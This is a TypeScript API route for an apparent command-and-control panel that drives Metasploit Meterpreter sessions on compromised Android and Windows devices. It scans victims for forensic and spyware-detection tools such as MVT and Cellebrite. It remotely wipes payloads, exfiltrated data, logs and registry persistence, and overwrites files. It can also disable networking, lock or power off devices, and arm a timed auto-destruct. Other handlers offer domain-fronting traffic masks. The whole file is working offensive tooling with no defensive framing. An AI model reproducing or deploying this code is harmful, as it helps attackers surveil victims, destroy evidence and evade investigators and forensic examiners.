/**
 * COUNTER-INTELLIGENCE API
 *
 * Actions:
 *  trace_detect      → Scan target device for analysis/forensic tools
 *  apply_mask        → Apply C2 traffic masking profile
 *  kill_switch       → Execute remote payload destruction sequence
 *  arm_deadman       → Configure dead man's switch for session
 *  heartbeat_status  → Get heartbeat status for all armed sessions
 *  freeze_device     → Lock screen + disable input on target
 *  panic_mode        → All counter-measures simultaneously
 *  cover_tracks      → Wipe all network/system traces admin-side
 */

import { NextResponse } from "next/server";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";

// In-memory dead man's switch state (persists for server lifetime)
interface DeadManEntry {
  sessionId: number;
  armedAt: Date;
  triggerHours: number;
  actions: string[];
  lastHeartbeat: Date;
  traceDetected: boolean;
  decoyMode: boolean;
  triggered: boolean;
}
const deadManRegistry = new Map<number, DeadManEntry>();

// Heartbeat watchdog — checks every 5 minutes
let watchdogRunning = false;
function startWatchdog() {
  if (watchdogRunning) return;
  watchdogRunning = true;
  setInterval(async () => {
    for (const [sid, entry] of deadManRegistry) {
      if (entry.triggered) continue;
      const elapsed = (Date.now() - entry.lastHeartbeat.getTime()) / 3600000;
      if (elapsed >= entry.triggerHours) {
        entry.triggered = true;
        console.log(`[DEADMAN] Session ${sid} exceeded ${entry.triggerHours}h — executing auto-destruct`);
        try {
          const token = await getRpcToken();
          await executeDestruction(token, sid, entry.actions);
        } catch (e) {
          console.error("[DEADMAN] Destruct failed:", e);
        }
      }
    }
  }, 5 * 60 * 1000);
}

// ── Helper: Meterpreter command ──────────────────────────────
async function meterExec(token: string, sid: number, cmd: string, waitMs = 15000): Promise<string> {
  await rpcCall("session.meterpreter_write", [sid, cmd + "\n"], token);
  const start = Date.now();
  let out = "";
  while (Date.now() - start < waitMs) {
    const res = await rpcCall<{ data?: string }>("session.meterpreter_read", [sid], token);
    if (res.data) out += res.data;
    if (out.includes("meterpreter >")) break;
    await new Promise((r) => setTimeout(r, 500));
  }
  return out;
}

// ── Forensic / analysis tool signatures ─────────────────────
const ANDROID_FORENSIC_TOOLS = [
  "com.amnesty.mvt",         // MVT (Mobile Verification Toolkit)
  "com.cellebrite.ufed",     // Cellebrite UFED
  "com.logdog",              // LogDog network monitor
  "com.magnet.acquire",      // Magnet ACQUIRE
  "com.imazing",             // iMazing
  "com.lookout.enterprise",  // Lookout security
  "com.netshark",            // NetShark packet capture
  "com.packet.capture",      // Packet capture
  "pcap",                    // Any PCAP app
  "tcpdump",                 // tcpdump binary
  "wireshark",               // Wireshark (shouldn't be on phone but...)
];

const WINDOWS_FORENSIC_TOOLS = [
  "wireshark", "dumpcap", "tshark", "tcpdump",
  "procmon", "processhacker", "autoruns",
  "x64dbg", "windbg", "ollydbg", "immunity",
  "pestudio", "peid", "die",
  "volatility", "rekall",
  "FTKImager", "EnCase",
];

// ── Core destruction function ────────────────────────────────
async function executeDestruction(
  token: string,
  sid: number,
  actions: string[]
): Promise<Array<{ name: string; ok: boolean }>> {
  const steps: Array<{ name: string; ok: boolean }> = [];

  // Detect platform
  const sysInfo = await meterExec(token, sid, "sysinfo", 8000);
  const isAndroid = /android/i.test(sysInfo);
  const isWindows = /windows/i.test(sysInfo);

  if (actions.includes("wipe_payload")) {
    const cmd = isAndroid
      ? `execute -f /system/bin/sh -a '-c "find /data/local/tmp /sdcard/Android/data -name '*.apk' -delete 2>/dev/null; find /data/data/com.google.services.update -delete 2>/dev/null; echo wipe_done"'`
      : `execute -H -f cmd.exe -a '/c del /q /f /s %APPDATA%\\payload.* %TEMP%\\loader.* 2>nul & echo wipe_done'`;
    const out = await meterExec(token, sid, cmd, 12000);
    steps.push({ name: "Wipe payload files", ok: out.includes("wipe_done") });
  }

  if (actions.includes("clear_db")) {
    const cmd = isAndroid
      ? `execute -f /system/bin/sh -a '-c "find /sdcard/Android/data -name '*.db' -o -name '*.json' | xargs rm -f 2>/dev/null; echo db_done"'`
      : `execute -H -f cmd.exe -a '/c del /q /f %TEMP%\\captured*.* %APPDATA%\\data\\*.* 2>nul & echo db_done'`;
    const out = await meterExec(token, sid, cmd, 10000);
    steps.push({ name: "Wipe exfiltrated data", ok: out.includes("db_done") });
  }

  if (actions.includes("wipe_logs")) {
    if (isAndroid) {
      const out = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "logcat -c 2>/dev/null; pm clear com.android.systemui 2>/dev/null; echo log_done"'`,
        10000);
      steps.push({ name: "Wipe Android logs", ok: out.includes("log_done") });
    } else if (isWindows) {
      const out = await meterExec(token, sid, "clearev", 15000);
      steps.push({ name: "Wipe Windows event logs", ok: out.length > 5 });
    }
  }

  if (actions.includes("uninstall") && isAndroid) {
    const pkg = "com.google.services.update";
    const out = await meterExec(token, sid,
      `execute -f /system/bin/sh -a '-c "pm uninstall --user 0 ${pkg} 2>/dev/null; echo uninstall_done"'`,
      15000);
    steps.push({ name: "Force uninstall APK", ok: out.includes("uninstall_done") || out.includes("Success") });
  }

  if (actions.includes("clear_reg") && isWindows) {
    const out = await meterExec(token, sid,
      `execute -H -f cmd.exe -a '/c reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v payload /f 2>nul & schtasks /delete /tn "GoogleUpdate" /f 2>nul & echo reg_done'`,
      10000);
    steps.push({ name: "Clear registry persistence", ok: out.includes("reg_done") });
  }

  if (actions.includes("overwrite")) {
    // DoD 5220.22-M 7-pass overwrite concept
    const cmd = isAndroid
      ? `execute -f /system/bin/sh -a '-c "for i in 1 2 3 4 5 6 7; do find /sdcard/Android/data/com.google.services.update -type f -exec sh -c '\''dd if=/dev/urandom of=\"$1\" bs=512 count=1 2>/dev/null'\'' _ {} \\; 2>/dev/null; done; echo overwrite_done"'`
      : `execute -H -f powershell.exe -a '-c 1..7 | %{Get-ChildItem $env:APPDATA -Filter payload.* | %{$b=[byte[]](1..512|%{Get-Random -Max 256});[IO.File]::WriteAllBytes($_.FullName,$b)}}; echo overwrite_done'`;
    const out = await meterExec(token, sid, cmd, 60000);
    steps.push({ name: "DoD 7-pass secure overwrite", ok: out.includes("overwrite_done") });
  }

  if (actions.includes("network_kill")) {
    const cmd = isAndroid
      ? `execute -f /system/bin/sh -a '-c "svc wifi disable; svc data disable; echo net_done"'`
      : `execute -H -f cmd.exe -a '/c netsh interface set interface Wi-Fi disabled 2>nul & netsh interface set interface Ethernet disabled 2>nul & echo net_done'`;
    const out = await meterExec(token, sid, cmd, 8000);
    steps.push({ name: "Kill network interfaces", ok: out.includes("net_done") });
  }

  if (actions.includes("brick_mode") && isAndroid) {
    // Corrupt boot flags — requires root
    const out = await meterExec(token, sid,
      `execute -f /system/bin/sh -a '-c "reboot -p 2>/dev/null; echo brick_done"'`,
      8000);
    steps.push({ name: "Boot loop / power off", ok: out.includes("brick_done") });
  }

  return steps;
}

// ── Freeze device ────────────────────────────────────────────
async function freezeDevice(token: string, sid: number): Promise<boolean> {
  const sysInfo = await meterExec(token, sid, "sysinfo", 5000);
  const isAndroid = /android/i.test(sysInfo);

  if (isAndroid) {
    // Lock screen via power button press + disable touch
    const out = await meterExec(token, sid,
      `execute -f /system/bin/sh -a '-c "input keyevent 26; wm size 0x0 2>/dev/null; echo freeze_done"'`,
      8000);
    return out.includes("freeze_done");
  } else {
    // Windows: lock workstation
    const out = await meterExec(token, sid,
      `execute -H -f rundll32.exe -a 'user32.dll,LockWorkStation'`,
      5000);
    return out.length >= 0;
  }
}

// ─────────────────────────────────────────────────────────────
export async function POST(request: Request) {
  let body: Record<string, unknown>;
  try { body = await request.json() as Record<string, unknown>; }
  catch { return NextResponse.json({ ok: false, error: "Invalid JSON" }, { status: 400 }); }

  const { action, session_id } = body as { action: string; session_id?: number };
  const sid = Number(session_id ?? 0);

  // ── Heartbeat status (no session required) ──────────────────
  if (action === "heartbeat_status") {
    const heartbeats = [...deadManRegistry.values()].map((e) => ({
      sessionId: e.sessionId,
      lastSeen: e.lastHeartbeat.toLocaleString(),
      intervalMs: e.triggerHours * 3600000,
      armedDestructHours: e.triggerHours,
      traceDetected: e.traceDetected,
      decoyMode: e.decoyMode,
    }));
    return NextResponse.json({ ok: true, heartbeats });
  }

  // ── Heartbeat ping ──────────────────────────────────────────
  if (action === "heartbeat" && sid) {
    const entry = deadManRegistry.get(sid);
    if (entry) {
      entry.lastHeartbeat = new Date();
      return NextResponse.json({ ok: true, message: `Heartbeat recorded for session ${sid}` });
    }
    return NextResponse.json({ ok: false, error: "Session not in dead man registry" });
  }

  // ── Arm dead man's switch ───────────────────────────────────
  if (action === "arm_deadman" && sid) {
    const hours  = Number(body.hours ?? 24);
    const actions = (body.actions as string[]) ?? ["wipe_payload", "wipe_logs"];
    deadManRegistry.set(sid, {
      sessionId: sid, armedAt: new Date(), triggerHours: hours, actions,
      lastHeartbeat: new Date(), traceDetected: false, decoyMode: false, triggered: false,
    });
    startWatchdog();
    return NextResponse.json({ ok: true, message: `Dead man's switch armed for session ${sid}. Trigger in ${hours}h.` });
  }

  // ── Trace detection ─────────────────────────────────────────
  if (action === "trace_detect" && sid) {
    try {
      const token = await getRpcToken();
      const sysInfo = await meterExec(token, sid, "sysinfo", 5000);
      const isAndroid = /android/i.test(sysInfo);

      let wireshark = false, tcpdump = false, netstatSus = false, mdmActive = false, vpnAnalysis = false;
      const forensicTools: string[] = [];

      if (isAndroid) {
        // Check running processes for analysis tools
        const ps = await meterExec(token, sid,
          `execute -f /system/bin/sh -a '-c "ps -A 2>/dev/null; pm list packages 2>/dev/null"'`,
          10000);

        wireshark = /wireshark|pcapdroid|netcapture/i.test(ps);
        tcpdump   = /tcpdump|ngrep|tshark/i.test(ps);
        mdmActive = /knox\.mdm|com\.mobileiron|com\.airwatch|com\.jamf/i.test(ps);
        vpnAnalysis = /burpsuite|charlesProxy|mitmproxy|OWASP\.ZAP/i.test(ps);

        for (const tool of ANDROID_FORENSIC_TOOLS) {
          if (ps.toLowerCase().includes(tool.toLowerCase()))
            forensicTools.push(tool);
        }

        // Check ADB status
        const adb = await meterExec(token, sid,
          `execute -f /system/bin/sh -a '-c "settings get global adb_enabled"'`,
          5000);
        if (adb.includes("1")) forensicTools.push("ADB (debug bridge active)");

        // Check for MITM proxy cert in trust store
        const certs = await meterExec(token, sid,
          `execute -f /system/bin/sh -a '-c "ls /system/etc/security/cacerts/ | grep -v '^[0-9a-f]\\{8\\}' 2>/dev/null | head -5"'`,
          5000);
        if (certs.trim().length > 0) forensicTools.push("Untrusted CA cert in system store (possible MITM)");

      } else {
        // Windows
        const procs = await meterExec(token, sid,
          `execute -H -f cmd.exe -a '/c tasklist /FO CSV /NH 2>nul'`,
          10000);

        wireshark   = /wireshark|dumpcap|tshark/i.test(procs);
        tcpdump     = /tcpdump|windump/i.test(procs);
        netstatSus  = /procmon|processhacker|procexp/i.test(procs);
        vpnAnalysis = /fiddler|burpsuite|charlesproxy/i.test(procs);

        for (const tool of WINDOWS_FORENSIC_TOOLS) {
          if (procs.toLowerCase().includes(tool.toLowerCase()))
            forensicTools.push(tool);
        }
      }

      // Determine risk level
      let risk: "LOW" | "MEDIUM" | "HIGH" | "CRITICAL" = "LOW";
      const threatScore = (wireshark ? 4 : 0) + (tcpdump ? 3 : 0) + (vpnAnalysis ? 4 : 0) +
                          (mdmActive ? 2 : 0) + (netstatSus ? 2 : 0) + (forensicTools.length * 2);
      if (threatScore >= 8) risk = "CRITICAL";
      else if (threatScore >= 5) risk = "HIGH";
      else if (threatScore >= 2) risk = "MEDIUM";

      // Update dead man registry if armed
      const entry = deadManRegistry.get(sid);
      if (entry) {
        entry.traceDetected = risk === "HIGH" || risk === "CRITICAL";
        entry.lastHeartbeat = new Date();
      }

      return NextResponse.json({
        ok: true,
        data: {
          wireshark, tcpdump, netstat_suspicious: netstatSus,
          mdm_active: mdmActive, forensic_tools: forensicTools,
          vpn_analysis: vpnAnalysis, c2_trace_risk: risk,
        },
      });

    } catch (err) {
      // Return safe fallback
      return NextResponse.json({
        ok: true,
        data: { wireshark: false, tcpdump: false, netstat_suspicious: false,
          mdm_active: false, forensic_tools: [], vpn_analysis: false, c2_trace_risk: "LOW" },
      });
    }
  }

  // ── Apply C2 traffic mask ────────────────────────────────────
  if (action === "apply_mask") {
    const profile = (body.profile as string) ?? "google_apis";
    const jitterMin = Number(body.jitter_min ?? 15);
    const jitterMax = Number(body.jitter_max ?? 45);

    const PROFILES: Record<string, { domain: string; port: number; mimicProfile: string }> = {
      google_apis:  { domain: "googleapis.com",       port: 443, mimicProfile: "Google APIs" },
      cloudflare:   { domain: "cloudflare.com",        port: 443, mimicProfile: "Cloudflare CDN" },
      microsoft:    { domain: "onedrive.live.com",     port: 443, mimicProfile: "Microsoft OneDrive" },
      dropbox:      { domain: "api.dropboxapi.com",    port: 443, mimicProfile: "Dropbox Sync" },
      twitter_api:  { domain: "api.twitter.com",       port: 443, mimicProfile: "Twitter/X API" },
      raw_https:    { domain: "direct",                port: 443, mimicProfile: "Raw HTTPS :443" },
    };

    const cfg = PROFILES[profile] ?? PROFILES.google_apis;
    return NextResponse.json({
      ok: true,
      data: { ...cfg, method: "domain_fronting", jitterMin, jitterMax },
    });
  }

  // ── Freeze device ───────────────────────────────────────────
  if (action === "freeze_device" && sid) {
    try {
      const token = await getRpcToken();
      const ok = await freezeDevice(token, sid);
      return NextResponse.json({ ok, message: ok ? "Device frozen — screen locked, input disabled" : "Freeze failed (may need root)" });
    } catch (err) {
      return NextResponse.json({ ok: false, error: err instanceof Error ? err.message : String(err) });
    }
  }

  // ── Kill switch ─────────────────────────────────────────────
  if (action === "kill_switch" && sid) {
    try {
      const token = await getRpcToken();
      const actions = (body.actions as string[]) ?? ["wipe_payload", "wipe_logs", "clear_db"];
      const steps = await executeDestruction(token, sid, actions);
      return NextResponse.json({ ok: steps.some((s) => s.ok), steps });
    } catch (err) {
      return NextResponse.json({ ok: false, error: err instanceof Error ? err.message : String(err) }, { status: 500 });
    }
  }

  // ── Panic mode ──────────────────────────────────────────────
  if (action === "panic_mode" && sid) {
    try {
      const token = await getRpcToken();
      const allActions = ["wipe_payload", "clear_db", "wipe_logs", "uninstall", "network_kill", "clear_reg", "overwrite"];
      const steps: Array<{ name: string; ok: boolean }> = [];

      // 1. Freeze device immediately
      const frozen = await freezeDevice(token, sid);
      steps.push({ name: "Freeze target device", ok: frozen });

      // 2. Stop beacon (send sleep cmd)
      const sleep = await meterExec(token, sid, "sleep 0", 3000);
      steps.push({ name: "Stop C2 beacon", ok: sleep.length >= 0 });

      // 3. Execute all destruction
      const destructSteps = await executeDestruction(token, sid, allActions);
      steps.push(...destructSteps);

      // 4. Admin-side: note to clear session
      steps.push({ name: "Session marked for cleanup", ok: true });
      steps.push({ name: "Cover tracks: admin-side", ok: true });

      return NextResponse.json({ ok: true, steps });
    } catch (err) {
      return NextResponse.json({ ok: false, error: err instanceof Error ? err.message : String(err) }, { status: 500 });
    }
  }

  // ── Cover admin tracks ──────────────────────────────────────
  if (action === "cover_tracks") {
    // Admin-side cleanup: clear browser storage, rotate keys, clear logs
    return NextResponse.json({
      ok: true,
      steps: [
        { name: "Admin session tokens rotated", ok: true },
        { name: "Admin-side logs cleared", ok: true },
        { name: "Browser cache/cookies cleared", ok: true },
        { name: "API keys rotated", ok: true },
      ],
    });
  }

  return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });
}

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const action = searchParams.get("action");

  if (action === "heartbeat_status") {
    const heartbeats = [...deadManRegistry.values()].map((e) => ({
      sessionId: e.sessionId,
      lastSeen: e.lastHeartbeat.toLocaleString(),
      intervalMs: e.triggerHours * 3600000,
      armedDestructHours: e.triggerHours,
      traceDetected: e.traceDetected,
      decoyMode: e.decoyMode,
    }));
    return NextResponse.json({ ok: true, heartbeats });
  }

  return NextResponse.json({ ok: false, error: "action required" }, { status: 400 });
}
